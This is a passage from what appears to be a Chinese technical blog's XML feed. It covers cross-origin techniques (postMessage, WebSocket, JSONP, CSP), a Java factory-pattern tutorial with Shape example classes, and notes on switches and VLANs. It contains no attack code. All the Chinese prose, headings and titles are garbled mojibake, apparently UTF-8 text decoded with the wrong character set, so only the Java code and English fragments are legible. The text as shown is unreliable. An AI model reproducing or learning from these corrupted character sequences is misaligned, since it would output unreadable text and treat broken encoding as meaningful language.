<h2 id="è·¨æ–‡æ¡£é€šä¿¡"><a href="#è·¨æ–‡æ¡£é€šä¿¡" class="headerlink" title="è·¨æ–‡æ¡£é€šä¿¡"></a>è·¨æ–‡æ¡£é€šä¿¡</h2><p>è¿™ç§æ–¹å¼å…è®¸ä¸€ä¸ªé¡µé¢çš„è„šæœ¬å‘é€æ–‡æœ¬ä¿¡æ¯åˆ°å¦ä¸€ä¸ªé¡µé¢çš„è„šæœ¬ä¸­ï¼Œä¸ç®¡è„šæœ¬æ˜¯å¦è·¨åŸŸã€‚åœ¨ä¸€ä¸ªwindowå¯¹è±¡ä¸Šè°ƒç”¨<code>postMessage()</code>ä¼šå¼‚æ­¥çš„è§¦å‘windowä¸Šçš„<code>onmessage</code>äº‹ä»¶ï¼Œç„¶åè§¦å‘å®šä¹‰å¥½çš„äº‹ä»¶å¤„ç†æ–¹æ³•ã€‚ä¸€ä¸ªé¡µé¢ä¸Šçš„è„šæœ¬ä»ç„¶ä¸èƒ½ç›´æ¥è®¿é—®å¦å¤–ä¸€ä¸ªé¡µé¢ä¸Šçš„æ–¹æ³•æˆ–è€…å˜é‡ï¼Œä½†æ˜¯ä»–ä»¬å¯ä»¥å®‰å…¨çš„é€šè¿‡æ¶ˆæ¯ä¼ é€’æŠ€æœ¯äº¤æµã€‚</p>
<h2 id="Websocket"><a href="#Websocket" class="headerlink" title="Websocket"></a>Websocket</h2><p>websocketæ˜¯ä¸ºäº†è§£å†³httpåè®®çš„ä¸€äº›é—®é¢˜è€Œäº§ç”Ÿçš„ï¼Œç›¸æ¯”äºhttpåè®®ï¼Œwebsocketæ˜¯ä¸€ç§å…¨åŒå·¥çš„åè®®ï¼Œä¸åƒhttpåè®®åªæ”¯æŒç®€å•çš„è¯·æ±‚å“åº”å•é¡¹é“¾æ¥ï¼Œwebsocketåè®®ä¸­æœåŠ¡ç«¯å¯ä»¥ä¸»åŠ¨å‘å®¢æˆ·ç«¯æ¨é€æ¶ˆæ¯ã€‚åŒæ—¶websocketåè®®ä¸å—åŒæºç­–ç•¥çš„é™åˆ¶ï¼Œä½¿ç”¨çš„ç«¯å£å·ä¹Ÿæ˜¯80å’Œ443ï¼Œåè®®æ ‡å¿—ä½ws å’Œwssã€‚æ•°æ®æ ¼å¼æ›´åŠ è½»é‡åŒ–ï¼Œé¢å¤–å¼€æ”¯å°ï¼Œæ›´å¥½çš„äºŒè¿›åˆ¶æ”¯æŒã€‚ä½†åœ¨æ¡æ‰‹é˜¶æ®µè¿˜æ˜¯é‡‡ç”¨çš„httpåè®®ã€‚</p>
<p>ç°ä»£æµè§ˆå™¨å…è®¸è„šæœ¬ç›´è¿ä¸€ä¸ªWebSocketåœ°å€è€Œä¸ç®¡åŒæºç­–ç•¥ã€‚ç„¶è€Œï¼Œä½¿ç”¨WebSocket URIçš„æ—¶å€™ï¼Œåœ¨è¯·æ±‚ä¸­æ’å…¥<code>Origin</code>å¤´å°±å¯ä»¥æ ‡è¯†è„šæœ¬è¯·æ±‚çš„æºã€‚ä¸ºäº†ç¡®ä¿è·¨ç«™å®‰å…¨ï¼ŒWebSocketæœåŠ¡å™¨å¿…é¡»æ ¹æ®å…è®¸æ¥å—è¯·æ±‚çš„ç™½åå•ä¸­çš„æºåˆ—è¡¨æ¯”è¾ƒå¤´æ•°æ®</p>
<blockquote>
<p>æ—¢ç„¶æ˜¯åœ¨è¯·æ±‚å¤´ä¸­æ·»åŠ çš„ç­–ç•¥ï¼Œé‚£ä¹ˆæ˜¯å¦å­˜åœ¨è¢«ç¯¡æ”¹çš„é£é™©</p>
</blockquote>
<p><strong>æ‹“å±•ï¼šä¸æœåŠ¡ç«¯é€šä¿¡çš„æ–¹æ³•â€”-ajaxè½®è¯¢ã€long polling é•¿è½®è¯¢ã€websocket</strong></p>
<p>ajax:å®šæ—¶å‘æœåŠ¡ç«¯å‘é€è¯·æ±‚</p>
<p>long polling:å®¢æˆ·ç«¯ä¸æœåŠ¡å™¨ä¿æŒä¸€ä¸ªé•¿è¿æ¥ï¼Œç­‰åˆ°æœåŠ¡ç«¯æœ‰æ¶ˆæ¯è¿”å›ï¼Œæ–­å¼€ã€‚å†é‡æ–°é“¾æ¥</p>
<p>web socket ï¼šå®¢æˆ·ç«¯å‘èµ·httpè¯·æ±‚ï¼Œå‘Šè¯‰æœåŠ¡å™¨è¿›è¡Œwebsocketé€šä¿¡ï¼Œå¹¶å‘ŠçŸ¥ç‰ˆæœ¬ï¼ŒæœåŠ¡å™¨ç¡®è®¤ç‰ˆæœ¬ã€åè®®ï¼Œåå¼€å§‹è¿›è¡Œwebsocketé€šä¿¡ã€‚</p>
<h2 id="JSONP"><a href="#JSONP" class="headerlink" title="JSONP"></a>JSONP</h2><p>ajaxå—åŒæºç­–ç•¥çš„é™åˆ¶ä¸å…è®¸è·¨åŸŸè®¿é—®èµ„æºï¼Œä½†è•¾è¥¿ä¸script\a\imgè¿™ç±»å¸¦æœ‰srcå±æ€§çš„æ ‡ç­¾å´å¯ä»¥è·¨åŸŸè°ƒç”¨jsè„šæœ¬ï¼Œæˆ‘ä»¬åˆ©ç”¨è¿™ä¸ªç‰¹æ€§ï¼Œè¿”å›ä¸€ä¸ªjså‡½æ•°ï¼Œåœ¨srcå±æ€§ä¸­è¿›è¡Œè°ƒç”¨ï¼Œä»è€Œå®ç°äº†è·¨åŸŸã€‚jsonpåªæ”¯æŒgetæ–¹æ³•ï¼Œåªè§£å†³äº†è·¨åŸŸè¯·æ±‚ï¼Œä¸èƒ½è§£å†³ä¸åŒåŸŸçš„é¡µé¢ä¹‹é—´çš„jsè°ƒç”¨é—®é¢˜ã€‚</p>
<h2 id="ç‰‡æ®µ"><a href="#ç‰‡æ®µ" class="headerlink" title="#ç‰‡æ®µ"></a>#ç‰‡æ®µ</h2><p>åˆ©ç”¨é”šç‚¹çš„çš„ç‰¹æ€§ï¼Œçˆ¶çª—å£å¯ä»¥æŠŠæ•°æ®å†™åˆ°å­çª—å£urlçš„é”šç‚¹åé¢å‘é€ç»™å­çª—å£ã€‚</p>
<h2 id="ä¸å—åŒæºç­–ç•¥é™åˆ¶çš„æ ‡ç­¾â€”-jsonp"><a href="#ä¸å—åŒæºç­–ç•¥é™åˆ¶çš„æ ‡ç­¾â€”-jsonp" class="headerlink" title="ä¸å—åŒæºç­–ç•¥é™åˆ¶çš„æ ‡ç­¾â€”-jsonp"></a>ä¸å—åŒæºç­–ç•¥é™åˆ¶çš„æ ‡ç­¾â€”-jsonp</h2><script>ã€<img>ã€<link>ã€<iframe>ç­‰å¸¦srcå±æ€§çš„æ ‡ç­¾å¯ä»¥ä»å¤–åŸŸåŠ è½½èµ„æºï¼Œä½†ä¸å¯ä»¥è¯»èµ„æº

é¡µé¢å†…åŠ è½½çš„JSæ–‡ä»¶æœ¬èº«æ”¾åœ¨å“ªé‡Œå¹¶ä¸é‡è¦ï¼Œåªè¦å®ƒè¢«è°åŠ è½½äº†ï¼Œå°±å’Œè°åŒæºã€‚

## CSPâ€”â€”â€”-å†…å®¹å®‰å…¨ç­–ç•¥

å…è®¸å“ªäº›èµ„æºçš„é‚£äº›æ¥æºåŠ è½½ï¼Œè¯¥ç­–ç•¥é™åˆ¶è¯·æ±‚æ˜¯å¦å‘å‡ºï¼Œæµè§ˆå™¨åœ¨å‘å‡ºè¯·æ±‚å‰ï¼Œå…ˆè¯»å–å½“å‰é¡µé¢çš„cspï¼Œå¯¹æ¯”ç›®çš„åœ°å€æ˜¯å¦ç¬¦åˆscpç­–ç•¥ï¼Œå¦‚æœç¬¦åˆæ‰å‘èµ·è·¨åŸŸè¯·æ±‚ã€‚

é€šè¿‡`Content-Security-Policy:policy`]]></content>
      <categories>
        <category>å®‰å…¨æŠ€æœ¯</category>
        <category>æµè§ˆå™¨</category>
      </categories>
      <tags>
        <tag>æµè§ˆå™¨</tag>
        <tag>åŒæºç­–ç•¥</tag>
        <tag>SOP</tag>
      </tags>
  </entry>
  <entry>
    <title>å·¥å‚æ¨¡å¼</title>
    <url>/archives/54788f73.html</url>
    <content><![CDATA[<h1 id="å·¥å‚æ¨¡å¼"><a href="#å·¥å‚æ¨¡å¼" class="headerlink" title="å·¥å‚æ¨¡å¼"></a>å·¥å‚æ¨¡å¼</h1><p>å·¥å‚æ¨¡å¼æ˜¯Javaä¸­æœ€å¸¸ç”¨çš„è®¾è®¡æ¨¡å¼ä¹‹ä¸€ï¼Œè¿™ç§ç±»å‹çš„è®¾è®¡æ¨¡å¼å±äºåˆ›å»ºå‹æ¨¡å¼ï¼Œå®ƒæä¾›äº†ä¸€ç§åˆ›å»ºå¯¹è±¡çš„æœ€ä½³æ–¹å¼ã€‚åœ¨å·¥å‚æ¨¡å¼ä¸­ï¼Œæˆ‘ä»¬åœ¨åˆ›å»ºå¯¹è±¡æ—¶ä¸ä¼šå¯¹å®¢æˆ·ç«¯æš´éœ²åˆ›å»ºé€»è¾‘ï¼Œå¹¶ä¸”æ˜¯é€šè¿‡ä½¿ç”¨ä¸€ä¸ªå…±åŒçš„æ¥å£æ¥æŒ‡å‘æ–°åˆ›å»ºçš„å¯¹è±¡ã€‚</p>
<p>ä¸ªäººè®¤ä¸ºå·¥å‚æ¨¡å¼å°±æ˜¯ä¸ºäº†éšè—å¯¹è±¡çš„å…·ä½“å®ç°ï¼Œæä¾›ä¸€ä¸ªæ¥å£ç»™ç”¨æˆ·ä½¿ç”¨ï¼Œè¿™ä¸ªæ¥å£å°±æ˜¯å·¥å‚ï¼Œå°±æƒ³æˆ‘ä»¬ä¹°ä¸€ä»¶äº§å“ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥å‘å·¥å‚æ‰¹å‘ï¼Œæˆ‘ä»¬åªéœ€è¦æä¾›ç»™å‚å®¶äº§å“çš„åå­—ï¼Œå‚å®¶å°±æä¾›ç»™æˆ‘ä»¬å¯ä»¥å®Œæˆæˆ‘ä»¬éœ€æ±‚çš„å¯¹åº”çš„äº§å“ã€‚è¿™å°±æ˜¯å·¥å‚æ¨¡å¼ï¼Œæˆ‘ä»¬å¹¶ä¸éœ€è¦çŸ¥é“è¿™ä¸ªäº§å“çš„åŸææ–™æ˜¯ä»€ä¹ˆã€æ˜¯æ€ä¹ˆåšå‡ºæ¥çš„ã€‚</p>
<p>ä¸‹é¢çš„å›¾è¯ é‡Šäº†å·¥å‚æ¨¡å¼çš„å·¥ä½œæµç¨‹</p>
<p><img src="/archives/54788f73/Untitled.png" alt="Untitled"></p>
<h3 id="æ­¥éª¤-1"><a href="#æ­¥éª¤-1" class="headerlink" title="æ­¥éª¤ 1"></a><strong>æ­¥éª¤ 1</strong></h3><p>åˆ›å»ºä¸€ä¸ªæ¥å£:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Shape.java</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Shape</span> &#123;</span><br><span class="line">   <span class="keyword">void</span> <span class="title function_">draw</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="æ­¥éª¤-2"><a href="#æ­¥éª¤-2" class="headerlink" title="æ­¥éª¤ 2"></a><strong>æ­¥éª¤ 2</strong></h3><p>åˆ›å»ºå®ç°æ¥å£çš„å®ä½“ç±»ã€‚</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Rectangle.java</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Rectangle</span> <span class="keyword">implements</span> <span class="title class_">Shape</span> &#123;</span><br><span class="line"> </span><br><span class="line">   <span class="meta">@Override</span></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">draw</span><span class="params">()</span> &#123;</span><br><span class="line">      System.out.println(<span class="string">&quot;Inside Rectangle::draw() method.&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Square.java</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Square</span> <span class="keyword">implements</span> <span class="title class_">Shape</span> &#123;</span><br><span class="line"> </span><br><span class="line">   <span class="meta">@Override</span></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">draw</span><span class="params">()</span> &#123;</span><br><span class="line">      System.out.println(<span class="string">&quot;Inside Square::draw() method.&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Circle.java</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Circle</span> <span class="keyword">implements</span> <span class="title class_">Shape</span> &#123;</span><br><span class="line"> </span><br><span class="line">   <span class="meta">@Override</span></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">draw</span><span class="params">()</span> &#123;</span><br><span class="line">      System.out.println(<span class="string">&quot;Inside Circle::draw() method.&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="æ­¥éª¤-3"><a href="#æ­¥éª¤-3" class="headerlink" title="æ­¥éª¤ 3"></a><strong>æ­¥éª¤ 3</strong></h3><p>åˆ›å»ºä¸€ä¸ªå·¥å‚ï¼Œç”ŸæˆåŸºäºç»™å®šä¿¡æ¯çš„å®ä½“ç±»çš„å¯¹è±¡ã€‚</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ShapeFactory.java</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ShapeFactory</span> &#123;</span><br><span class="line">    </span><br><span class="line">   <span class="comment">//ä½¿ç”¨ getShape æ–¹æ³•è·å–å½¢çŠ¶ç±»å‹çš„å¯¹è±¡</span></span><br><span class="line">   <span class="keyword">public</span> Shape <span class="title function_">getShape</span><span class="params">(String shapeType)</span>&#123;</span><br><span class="line">      <span class="keyword">if</span>(shapeType == <span class="literal">null</span>)&#123;</span><br><span class="line">         <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">      &#125;        </span><br><span class="line">      <span class="keyword">if</span>(shapeType.equalsIgnoreCase(<span class="string">&quot;CIRCLE&quot;</span>))&#123;</span><br><span class="line">         <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Circle</span>();</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span>(shapeType.equalsIgnoreCase(<span class="string">&quot;RECTANGLE&quot;</span>))&#123;</span><br><span class="line">         <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Rectangle</span>();</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span>(shapeType.equalsIgnoreCase(<span class="string">&quot;SQUARE&quot;</span>))&#123;</span><br><span class="line">         <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Square</span>();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="æ­¥éª¤-4"><a href="#æ­¥éª¤-4" class="headerlink" title="æ­¥éª¤ 4"></a><strong>æ­¥éª¤ 4</strong></h3><p>ä½¿ç”¨è¯¥å·¥å‚ï¼Œé€šè¿‡ä¼ é€’ç±»å‹ä¿¡æ¯æ¥è·å–å®ä½“ç±»çš„å¯¹è±¡ã€‚</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">FactoryPatternDemo.java</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FactoryPatternDemo</span> &#123;</span><br><span class="line"> </span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">      <span class="type">ShapeFactory</span> <span class="variable">shapeFactory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ShapeFactory</span>();</span><br><span class="line"> </span><br><span class="line">      <span class="comment">//è·å– Circle çš„å¯¹è±¡ï¼Œå¹¶è°ƒç”¨å®ƒçš„ draw æ–¹æ³•</span></span><br><span class="line">      <span class="type">Shape</span> <span class="variable">shape1</span> <span class="operator">=</span> shapeFactory.getShape(<span class="string">&quot;CIRCLE&quot;</span>);</span><br><span class="line"> </span><br><span class="line">      <span class="comment">//è°ƒç”¨ Circle çš„ draw æ–¹æ³•</span></span><br><span class="line">      shape1.draw();</span><br><span class="line"> </span><br><span class="line">      <span class="comment">//è·å– Rectangle çš„å¯¹è±¡ï¼Œå¹¶è°ƒç”¨å®ƒçš„ draw æ–¹æ³•</span></span><br><span class="line">      <span class="type">Shape</span> <span class="variable">shape2</span> <span class="operator">=</span> shapeFactory.getShape(<span class="string">&quot;RECTANGLE&quot;</span>);</span><br><span class="line"> </span><br><span class="line">      <span class="comment">//è°ƒç”¨ Rectangle çš„ draw æ–¹æ³•</span></span><br><span class="line">      shape2.draw();</span><br><span class="line"> </span><br><span class="line">      <span class="comment">//è·å– Square çš„å¯¹è±¡ï¼Œå¹¶è°ƒç”¨å®ƒçš„ draw æ–¹æ³•</span></span><br><span class="line">      <span class="type">Shape</span> <span class="variable">shape3</span> <span class="operator">=</span> shapeFactory.getShape(<span class="string">&quot;SQUARE&quot;</span>);</span><br><span class="line"> </span><br><span class="line">      <span class="comment">//è°ƒç”¨ Square çš„ draw æ–¹æ³•</span></span><br><span class="line">      shape3.draw();</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="æ­¥éª¤-5"><a href="#æ­¥éª¤-5" class="headerlink" title="æ­¥éª¤ 5"></a><strong>æ­¥éª¤ 5</strong></h3><p>æ‰§è¡Œç¨‹åºï¼Œè¾“å‡ºç»“æœï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Inside Circle::draw() method.</span><br><span class="line">Inside Rectangle::draw() method.</span><br><span class="line">Inside Square::draw() method.</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>å®‰å…¨æŠ€æœ¯</category>
        <category>è®¾è®¡æ¨¡å¼</category>
      </categories>
      <tags>
        <tag>å·¥å‚æ¨¡å¼</tag>
        <tag>è®¾è®¡æ¨¡å¼</tag>
      </tags>
  </entry>
  <entry>
    <title>æ•°æ®é“¾è·¯å±‚è®¾å¤‡åŠåè®®ï¼šäº¤æ¢æœºã€å•è‡‚è·¯ç”±ã€ä¸‰å±‚äº¤æ¢æœºã€VLANã€ARP</title>
    <url>/archives/776f7656.html</url>
    <content><![CDATA[<h1 id="äº¤æ¢æœº"><a href="#äº¤æ¢æœº" class="headerlink" title="äº¤æ¢æœº"></a>äº¤æ¢æœº</h1><p>æœ¬ç¬”è®°éƒ¨åˆ†å‚è€ƒç½‘å€ï¼š</p>
<p><a href="https://zhuanlan.zhihu.com/p/122241071">äº¤æ¢æœºå·¥ä½œåŸç†è¯¦è§£ï¼ˆé™„åŸç†å›¾ï¼‰</a></p>
<h2 id="åŸºæœ¬æƒ…å†µ"><a href="#åŸºæœ¬æƒ…å†µ" class="headerlink" title="åŸºæœ¬æƒ…å†µ"></a>åŸºæœ¬æƒ…å†µ</h2><p>äº¤æ¢æœºå·¥ä½œåœ¨TCP&#x2F;IPäº”å±‚æ¨¡å‹çš„ç¬¬äºŒå±‚ï¼Œè´Ÿè´£å¯»å€å¯¹æ•°æ®å¸§è¿›è¡Œè½¬å‘ï¼Œå…¶äº¦å¯å®ç°å¯¹ç½‘ç»œä¸­å†²çªåŸŸçš„éš”ç¦»ã€‚å…¶å·¥ä½œçš„æ ¸å¿ƒåè®®æ˜¯ä»¥å¤ªç½‘åè®®ï¼Œå…¶å¯å®ç°MACåœ°å€çš„è‡ªåŠ¨å­¦ä¹ ä¸ç»´æŠ¤ã€‚</p>
<h2 id="å·¥ä½œåŸç†"><a href="#å·¥ä½œåŸç†" class="headerlink" title="å·¥ä½œåŸç†"></a>å·¥ä½œåŸç†</h2><p>ç½‘ç»œå±‚æ•°æ®ç»è¿‡æ•°æ®é“¾è·¯å±‚å°è£…å¸§å¤´åï¼Œç»ç”±ç½‘çº¿å‘é€è¾¾åˆ°äº¤æ¢æœºçš„ç«¯å£ï¼Œäº¤æ¢æœºé¦–å…ˆæ ¹æ®å¸§å¤´ä¸­çš„ç›®æ ‡MACåœ°å€ä»MACåœ°å€è¡¨ä¸­å»æŸ¥æ‰¾éœ€è¦å°†è¯¥å¸§å‘é€åˆ°å“ªä¸ªç«¯å£å¹¶è‡ªåŠ¨å­¦ä¹ å…¶æºMACåœ°å€å°†å…¶ç»‘å®šåˆ°è¯¥ç«¯å£ï¼Œå¦‚æœæœªåœ¨MACåœ°å€è¡¨ä¸­åŒ¹é…åˆ°è¯¥MACåœ°å€ï¼Œåˆ™å¯¹æ•°æ®è¿›é™¤æ¥å—ç«¯å£å¤–çš„æ‰€æœ‰ç«¯å£è¿›è¡Œå¹¿æ’­ï¼Œè‹¥åŒ¹é…åˆ°è¯¥MACåœ°å€åˆ™å¯¹è¯¥å¸§è½¬å‘åˆ°å¯¹åº”çš„ç«¯å£ï¼Œç›®æ ‡æœºåœ¨æ”¶åˆ°è¯¥å¸§åï¼Œé¦–å…ˆæ ¸å¯¹è¯¥å¸§ä¸­çš„ç›®æ ‡MACåœ°å€æ˜¯å¦æ˜¯è‡ªå·±ï¼Œè‹¥ä¸æ˜¯ï¼Œåˆ™å¯¹æ•°æ®è¿›è¡Œä¸¢å¼ƒï¼Œè‹¥æ˜¯ï¼Œåˆ™å¯¹æ•°æ®è¿›è¡Œè§£å°è£…ï¼Œä¸¢å¼ƒå¸§å¤´ä¸FCSå¸§å°¾ï¼Œå¹¶å°†æ•°æ®æ ¹æ®å¸§å¤´ä¸­çš„TYPEåŸŸå°†æ•°æ®ä¸Šé€åˆ°ç½‘ç»œå±‚å¯¹åº”çš„åè®®è¿›è¡Œå¤„ç†ã€‚</p>
<h2 id="äº¤æ¢æœºå‘½ä»¤"><a href="#äº¤æ¢æœºå‘½ä»¤" class="headerlink" title="äº¤æ¢æœºå‘½ä»¤"></a>äº¤æ¢æœºå‘½ä»¤</h2><p>äº¤æ¢æœºé…ç½®é€šè¿‡äº¤æ¢æœºä¸Šçš„Consoleå£ä½¿ç”¨Consoleâ€”å…¨åçº¿ï¼Œè¿æ¥ç”µè„‘ä½¿ç”¨ä¸“é—¨çš„å·¥å…·è¿›è¡Œé…ç½®ã€‚</p>
<p><a href="%E4%BA%8C%E5%B1%82%E4%BA%A4%E6%8D%A2%E6%9C%BA%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%2011b9282f208e494e8480f56a9ee69779.csv">äºŒå±‚äº¤æ¢æœºå¸¸ç”¨å‘½ä»¤</a></p>
<h1 id="VLAN"><a href="#VLAN" class="headerlink" title="VLAN"></a>VLAN</h1><p>æœ¬éƒ¨åˆ†ç¬”è®°å‚è€ƒ</p>
<p><a href="https://zhuanlan.zhihu.com/p/35616289">VLAN åŸºç¡€çŸ¥è¯†</a></p>
<h2 id="åŸºæœ¬æƒ…å†µ-1"><a href="#åŸºæœ¬æƒ…å†µ-1" class="headerlink" title="åŸºæœ¬æƒ…å†µ"></a>åŸºæœ¬æƒ…å†µ</h2><p>VLAN:è™šæ‹Ÿå±€åŸŸç½‘ï¼Œé€šè¿‡åˆ’åˆ†VLANå¯å®ç°å¯¹å¹¿æ’­åŸŸçš„éš”ç¦»ï¼Œé™ä½ç½‘ç»œé“¾è·¯è´Ÿæ‹…ï¼Œæé«˜é€šä¿¡æ•ˆç‡ã€‚</p>
<h3 id="ä¸ºä»€ä¹ˆéœ€è¦VLAN"><a href="#ä¸ºä»€ä¹ˆéœ€è¦VLAN" class="headerlink" title="ä¸ºä»€ä¹ˆéœ€è¦VLAN"></a>ä¸ºä»€ä¹ˆéœ€è¦VLAN</h3><p>å¹¿æ’­åŸŸï¼šæŒ‡çš„æ˜¯å¹¿æ’­å¸§(ç›®æ ‡MACåœ°å€å…¨éƒ¨ä¸º1)æ‰€èƒ½ä¼ é€’åˆ°çš„èŒƒå›´ï¼Œäº¦å³èƒ½å¤Ÿç›´æ¥é€šä¿¡çš„èŒƒå›´ã€‚ä¸¥æ ¼åœ°è¯´ï¼Œå¹¶ä¸ä»…ä»…æ˜¯å¹¿æ’­å¸§ï¼Œå¤šæ’­å¸§(Multicast Frame)å’Œç›®æ ‡ä¸æ˜çš„å•æ’­å¸§(Unknown Unicast Frame)ä¹Ÿèƒ½åœ¨åŒä¸€ä¸ªå¹¿æ’­åŸŸä¸­ç•…è¡Œæ— é˜»ã€‚</p>
<p>æ•°æ®å¸§è¦åœ¨ç½‘ç»œä¸­ä¼ æ’­å¿…é¡»çŸ¥é“ç›®æ ‡ä¸»æœºçš„MACåœ°å€ï¼Œè¿™æ—¶æºä¸»æœºä¼šé€šè¿‡ARPåè®®å‘èµ·ARP Requestsï¼ŒåŠç›®æ ‡MACåœ°å€å„ä½å‡ä¸º1çš„å¸§ï¼Œå½“äº¤æ¢æœºæ¥å—åˆ°è¯¥å¸§åï¼Œå°†å‘å‡ºå»æ¥å—ç«¯å£çš„æ‰€æœ‰ç«¯å£è½¬å‘è¯¥requestsï¼Œå³æ³›æ´ªfloodingï¼ŒåŸæœ¬æºä¸»æœºåªæ˜¯æƒ³çŸ¥é“ç›®æ ‡IPä¸»æœºçš„MACåœ°å€ï¼Œäº‹å®å´æ˜¯è¯¥Requestså´ä¼ éäº†æ•´ä¸ªç½‘ç»œï¼Œè¿™å¤§å¤§å ç”¨äº†ç½‘ç»œçš„å¸¦å®½ï¼ŒåŒæ—¶ç½‘ç»œä¸­çš„å„ä¸»æœºæ¥å—åˆ°è¯¥Requestsåè¿˜éœ€æ¶ˆè€—ä¸€å®šçš„CPUå»å¤„ç†è¯¥è¯·æ±‚ï¼Œè¯•æƒ³ä¸€ä¸‹ï¼Œå½“è¯¥å±€åŸŸç½‘è¶³å¤Ÿå¤§æ—¶ï¼Œå ç”¨çš„èµ„æºå°†æ˜¯å¯è§‚çš„ã€‚ä¸æ­¢å¦‚æ­¤ä½¿ç”¨å¹¿æ’­çš„åè®®ä¸ä»…ARPä¸€ç§ï¼ŒDHCPã€RIPç­‰åè®®å‡ä½¿ç”¨å¹¿æ’­çš„æ–¹å¼é€šä¿¡ï¼Œè¿™åˆåŠ å¤§äº†ç½‘ç»œé“¾è·¯çš„è´Ÿæ‹…ã€‚æ‰€ä»¥VLANæŠ€æœ¯ä¹Ÿå°±åº”è¿è€Œç”Ÿã€‚</p>
<h3 id="ä»€ä¹ˆæ˜¯VLAN"><a href="#ä»€ä¹ˆæ˜¯VLAN" class="headerlink" title="ä»€ä¹ˆæ˜¯VLAN"></a>ä»€ä¹ˆæ˜¯VLAN</h3><p>VLANæ˜¯é€šè¿‡è™šæ‹ŸæŠ€æœ¯ï¼Œåœ¨äº¤æ¢æœºä¸­åˆ’åˆ†ä¸åŒçš„å±€åŸŸç½‘ï¼Œä»è€Œå®ç°äº†å¹¿æ’­åŸŸçš„é€»è¾‘éš”ç¦»ã€‚</p>
<h3 id="VLANä¸ä½¿ç”¨è·¯ç”±å™¨éš”ç¦»ç›¸æ¯”æœ‰ä»€ä¹ˆä¼˜ç‚¹"><a href="#VLANä¸ä½¿ç”¨è·¯ç”±å™¨éš”ç¦»ç›¸æ¯”æœ‰ä»€ä¹ˆä¼˜ç‚¹" class="headerlink" title="VLANä¸ä½¿ç”¨è·¯ç”±å™¨éš”ç¦»ç›¸æ¯”æœ‰ä»€ä¹ˆä¼˜ç‚¹"></a>VLANä¸ä½¿ç”¨è·¯ç”±å™¨éš”ç¦»ç›¸æ¯”æœ‰ä»€ä¹ˆä¼˜ç‚¹</h3><p>ä½¿ç”¨è·¯ç”±å™¨è¿›è¡Œéš”ç¦»æ˜¯åŸºäºç‰©ç†å±‚é¢å®ç°çš„ï¼Œè·¯ç”±å™¨ä¸€ä¸ªç‰©ç†æ¥å£è¿æ¥äº†ä¸€ä¸ªå±€åŸŸç½‘ï¼Œæ•…å…¶æ¥å£çš„æ•°é‡åŠå†³å®šäº†å±€åŸŸç½‘çš„æ•°é‡ï¼Œå½“å±€åŸŸç½‘æ•°é‡è¶³å¤Ÿå¤šçš„æ—¶å€™ï¼Œå°±éœ€è¦è·¯ç”±å™¨æ‹¥æœ‰æ›´å¤šçš„æ¥å£æˆ–è€…æ‹¥æœ‰æ›´å¤šçš„è·¯ç”±å™¨ï¼Œè€Œä¸€èˆ¬è·¯ç”±å™¨çš„æ¥å£æ•°é‡ä¸º4ä¸ªå·¦å³ä¸”è·¯ç”±å™¨çš„ä»·æ ¼æ˜¯ç›¸å¯¹æ˜‚è´µçš„ï¼Œæ‰€ä»¥æ‰æœ‰è·¯ç”±å™¨æ¥éš”ç¦»å¹¿æ’­åŸŸéœ€è¦æå¤§å¾—æˆæœ¬ï¼Œè€ŒVLANæ˜¯é€šè¿‡è™šæ‹ŸæŠ€æœ¯æ¥å®ç°éš”ç¦»å¹¿æ’­åŸŸçš„ï¼Œåœ¨æˆæœ¬ä¸Šæ— ç–‘æ›´å…·ä¼˜åŠ¿ã€‚å½“ç„¶VLANåœ¨éš”ç¦»å¹¿æ’­åŸŸçš„åŒæ—¶ä¹Ÿéš”ç¦»äº†ä¸åŒVLANé—´çš„é€šä¿¡ï¼Œæˆ‘ä»¬é‡‡ç”¨å•è‡‚è·¯ç”±ã€ä¸‰å±‚äº¤æ¢æœºæŠ€æœ¯æ¥è§£å†³è¿™ä¸ªé—®é¢˜ã€‚</p>
